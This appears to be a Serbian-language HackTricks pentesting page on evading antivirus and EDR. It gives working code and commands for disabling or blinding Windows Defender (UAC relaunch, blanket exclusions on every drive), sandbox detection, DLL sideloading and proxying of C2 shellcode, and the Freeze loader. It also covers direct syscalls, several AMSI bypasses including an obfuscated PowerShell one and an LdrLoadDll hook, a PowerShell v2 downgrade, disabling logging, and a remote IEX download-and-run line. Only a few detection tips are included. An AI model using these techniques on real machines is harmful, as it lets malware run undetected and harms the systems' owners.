# Zaobilaženje Antivirusne zaštite (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažnim predstavljanjem drugog AV-a.
- [Onemogućite Defender ako ste admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC mamac pre neovlašćenog menjanja Defender-a

Javno dostupni loaderi koji se predstavljaju kao game cheats često se isporučuju kao nepotpisani Node.js/Nexe installeri koji prvo **traže od korisnika povišenje privilegija**, a tek zatim neutralizuju Defender. Tok je jednostavan:

1. Proverite da li postoji administrativni kontekst pomoću `net session`. Komanda uspeva samo kada caller ima admin prava, pa neuspeh ukazuje na to da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite sam loader pomoću `RunAs` verb-a da biste aktivirali očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju „crackovan“ softver, pa se upit obično prihvata, čime malware dobija prava potrebna za izmenu Defender-ove politike.

### Blanket `MpPreference` exclusions for every drive letter

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno povećavaju Defender-ove slepe tačke umesto da potpuno onemoguće servis. Loader najpre prekida GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim postavlja **izuzetno široke exclusions**, tako da svaki korisnički profil, sistemski direktorijum i removable disk postanu nedostupni za skeniranje:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload dodat bilo gde na disku ignoriše**.
- Isključivanje ekstenzije `.sys` je predviđeno za budućnost — napadači zadržavaju mogućnost da kasnije učitaju nepotpisane drivere bez ponovnog menjanja Defendera.
- Sve promene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci i dalje prisutni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, naivne provere stanja i dalje prijavljuju „antivirus active“, iako real-time inspekcija nikada ne proverava te putanje.

## **Metodologija AV Evasion**

Trenutno AV-ovi koriste različite metode za proveru da li je fajl malicious ili ne: static detection, dynamic analysis, a kod naprednijih EDR-ova i behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicious stringova ili nizova bajtova u binarnom fajlu ili scriptu, kao i izdvajanjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digitalni potpisi, ikona, checksum itd.). To znači da korišćenje poznatih javno dostupnih alata može lakše dovesti do detekcije, jer su oni verovatno već analizirani i označeni kao malicious. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Encryption**

Ako encryptuješ binary, AV neće moći da detektuje tvoj program, ali će ti biti potreban neki loader za decryption i pokretanje programa u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo promeniti neke stringove u binary fajlu ili scriptu da bi prošao AV, ali to može zahtevati dosta vremena, u zavisnosti od toga šta pokušavaš da obfuscate-uješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznati bad signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata, a zatim zadaje Defenderu da svaki od njih skenira pojedinačno; na taj način može precizno da ti kaže koji stringovi ili bajtovi u tvom binary fajlu su označeni.

Toplo preporučujem da pogledaš ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis podrazumeva da AV pokrene tvoj binary u sandboxu i prati malicious aktivnost (npr. pokušaj decryption-a i čitanja lozinki iz browsera, izvođenje minidump-a nad LSASS-om itd.). Ovaj deo može biti malo zahtevniji, ali evo nekoliko stvari koje možeš uraditi za izbegavanje sandboxova.

- **Sleep pre izvršavanja** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekinuli korisnikov rad, pa dugi sleep-ovi mogu ometati analysis binary fajlova. Problem je u tome što mnogi AV sandboxovi mogu jednostavno preskočiti sleep, u zavisnosti od načina implementacije.
- **Provera resursa računara** Sandboxovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. I ovde možeš biti veoma kreativan, na primer proverom temperature CPU-a ili čak brzine ventilatora; neće sve biti implementirano u sandboxu.
- **Provere specifične za računar** Ako želiš da ciljaš korisnika čija je radna stanica pridružena domenu "contoso.local", možeš proveriti domen računara da vidiš da li se podudara sa onim koji si naveo; ako se ne podudara, možeš učiniti da se program zatvori.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa možeš proveriti ime računara u svom malware-u pre detonacije. Ako se ime podudara sa HAL9TH, to znači da se nalaziš unutar Defender sandboxa, pa možeš učiniti da se program zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandboxovima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo ranije rekli u ovom postu, **public tools** će vremenom biti **detektovani**, pa treba da postaviš sebi jedno pitanje:

Na primer, ako želiš da dump-uješ LSASS, **da li ti je zaista potreban mimikatz**? Ili bi mogao da koristiš neki drugi, manje poznat projekat koji takođe dump-uje LSASS?

Drugi odgovor je verovatno pravi. Ako uzmemo mimikatz kao primer, on je verovatno jedan od, ako ne i najviše označenih malware-a od strane AV-ova i EDR-ova. Iako je sam projekat veoma kvalitetan, rad sa njim radi zaobilaženja AV-ova predstavlja pravu noćnu moru, zato jednostavno potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada menjaš payload-e radi evasion-a, obavezno **isključi automatic sample submission** u Defenderu i, molim te, ozbiljno shvati ovo: **NEMOJ UPLOADOVATI NA VIRUSTOTAL** ako ti je cilj dugoročno postizanje evasion-a. Ako želiš da proveriš da li određeni AV detektuje tvoj payload, instaliraj ga na VM, pokušaj da isključiš automatic sample submission i testiraj ga tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **daj prednost korišćenju DLL-ova za evasion**, jer su prema mom iskustvu DLL fajlovi obično **mnogo ređe detektovani** i analizirani, pa je to veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako tvoj payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate 4/26 na antiscan.me, dok EXE payload ima detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a i normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima kako bi bili mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi search order DLL-ova koji loader primenjuje tako što postavlja i victim aplikaciju i malicious payload(e) jedne pored drugih.

Programe podložne DLL Sideloading-u možeš pronaći pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledećeg PowerShell script-a:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će prikazati listu programa podložnih DLL hijacking-u unutar direktorijuma "C:\Program Files\\" i DLL datoteke koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy kada se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa nazivom koji program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se naziva **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/).

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni DLL sa promenjenim imenom.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodovan pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je to uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo detaljnije govorili.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo „forwarders“: umesto pokazivanja na kod, eksportni unos sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada caller razrešava eksport, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, dobavlja se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni DLL search order, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektni primitiv za sideloading: pronađite potpisani DLL koji eksportuje funkciju prosleđenu ka nazivu modula koji nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om kojim upravlja napadač, imenovanim tačno kao prosleđeni ciljni modul. Kada se pozove forwarded export, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer uočen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi korišćenjem uobičajenog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder sa dozvolom za upis
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Ubacite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da bi se pokrenuo DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Uočeno ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward ka `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška "missing API" će se pojaviti tek nakon što je `DllMain` već izvršen

Saveti za hunting:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete enumerisati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventar da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz nesistemskih putanja, nakon čega iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Upozorite na lance procesa/modula kao što su: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` iz putanja u koje korisnik može da upisuje
- Primenite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je payload toolkit za zaobilaženje EDR-ova korišćenjem suspended processes, direct syscalls i alternative execution methods`

Freeze možete koristiti za učitavanje i izvršavanje shellcode-a na stealthy način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas može biti detektovano sutra, zato se nikada ne oslanjajte samo na jedan alat i, ako je moguće, pokušajte da ulančate više evasion tehnika.

## Direct/Indirect Syscalls i SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stubove. Da biste zaobišli te hookove, možete generisati **direct** ili **indirect syscall** stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hookovanog export entrypoint-a.

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (ne pristupa `ntdll` export-u).
- **Indirect**: skače u postojeći `syscall` gadget unutar `ntdll`-a, tako da prelaz u kernel izgleda kao da potiče iz `ntdll`-a (korisno za heurističku evasion); **randomized indirect** bira gadget iz skupa za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičkog `0F 05` opcode niza na disku; syscall sekvenca se pronalazi tokom runtime-a.

**Hook-resistant strategije za SSN resolution:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtuelnoj adresi, umesto čitanja bajtova stubova.
- **SyscallsFromDisk**: mapira čisti `\KnownDlls\ntdll.dll`, čita SSN-ove iz njegovog `.text` segmenta, a zatim ga odmapira (zaobilazi sve hookove u memoriji).
- **RecycledGate**: kombinuje VA-sorted SSN inference sa validacijom opcode-a kada je stub čist; ako je hookovan, vraća se na VA inference.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom runtime-a, bez parsiranja hookovanih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran kako bi sprečio "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV-ovi mogli da skeniraju samo **fajlove na disku**, tako da AV ne bi mogao ništa da uradi kako bi sprečio izvršavanje payload-a **direktno u memoriji**, jer ne bi imao dovoljnu vidljivost.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona antivirusnim rešenjima omogućava da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u formi koja je istovremeno nešifrovana i neofuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` proizvešće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:`, a zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo spustili nijedan fajl na disk, ali nas je AMSI ipak uhvatio u memoriji.

Pored toga, počevši od verzije **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zbog toga se korišćenje starijih verzija .NET-a (kao što su 4.7.2 ili starije) preporučuje za izvršavanje u memoriji ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi pomoću statičkih detekcija, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da ukloni obfuskaciju skripti čak i ako imaju više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađen. Zbog toga njegovo zaobilaženje nije naročito jednostavno. Ipak, ponekad je dovoljno samo da promenite nekoliko naziva promenljivih i bićete bezbedni, tako da sve zavisi od toga u kojoj meri je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (kao i cscript.exe, wscript.exe itd.) proces, moguće je lako manipulisati njime čak i kada se izvršava kao neprivilegovan korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina za izbegavanje AMSI skeniranja.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije da ne uspe (`amsiInitFailed`) dovešće do toga da se skeniranje ne pokrene za trenutni proces. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je potrebna samo jedna linija PowerShell koda da bi AMSI postao neupotrebljiv za trenutni PowerShell proces. Ovu liniju je, naravno, detektovao sam AMSI, pa je potrebna određena izmena kako bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti flagovano čim ova objava bude objavljena, zato ne bi trebalo da objavljujete nikakav kod ako je vaš plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI-ja u powershell-u. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan bypass nezavisan od jezika jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zahtevani modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i za taj proces se ne vrše skeniranja.

Pregled implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Funkcioniše u PowerShell-u, WScript/CScript-u i custom loader-ima (u svemu što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke command-line artefakte.
- Primećeno je da se koristi sa loader-ima izvršenim kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja koja izbegava signature pomoću randomizovanih user-defined funkcija, promenljivih i izraza sa karakterima, kao i primenom nasumičnog menjanja veličine slova u PowerShell ključnim rečima radi izbegavanja signature-a.

**Uklonite detektovani signature**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** za uklanjanje detektovanog AMSI signature-a iz memorije trenutnog procesa. Ovaj alat funkcioniše tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati skripte bez AMSI skeniranja. To možete učiniti ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete pokretati svoje skripte bez skeniranja od strane AMSI-ja. To možete uraditi ovako: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bez odbrana (ovo koristi `powerpick` iz Cobal Strike-a).


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation-a zasniva se na enkripciji podataka, što će povećati entropiju binarnog fajla i olakšati AV-ovima i EDR-ovima njegovu detekciju. Budite pažljivi sa ovim i možda primenite enkripciju samo na određene delove koda koji su osetljivi ili moraju biti skriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je naići na više slojeva zaštite koji će blokirati decompilere i sandbox-e. Tok rada u nastavku pouzdano **vraća skoro originalni IL**, koji se zatim može decompile-ovati u C# pomoću alata kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tampering zaštite – ConfuserEx enkriptuje svako *method body* telo i dekriptuje ga unutar statičkog konstruktora (`<Module>.cctor`) *module*-a. Ovo takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarnog fajla. Koristite **AntiTamperKiller** da pronađete enkriptovane metadata tabele, povratite XOR ključeve i ponovo napišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni prilikom izrade sopstvenog unpacker-a.

2.  Oporavak simbola / control-flow-a – prosledite *clean* fajl alatu **de4dot-cex** (fork-u de4dot-a koji podržava ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – bira ConfuserEx 2 profil
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dekriptovati konstantne stringove.

3.  Uklanjanje proxy-call-ova – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (poznatim i kao *proxy calls*) kako bi dodatno otežao decompilation. Uklonite ih pomoću alata **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload. Malware ga često čuva kao TLV-enkodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Navedeni lanac obnavlja tok izvršavanja **bez potrebe za pokretanjem malicioznog uzorka** – korisno pri radu na offline workstation-u.

> 🛈  ConfuserEx proizvodi custom attribute pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji pruža povećanu bezbednost softvera putem [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti jezik `C++11/14` za generisanje obfuskiranog koda u vreme kompajliranja, bez korišćenja eksternih alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskiranih operacija generisanih pomoću C++ template metaprogramming framework-a, što će osobi koja želi da crack-uje aplikaciju malo otežati posao.
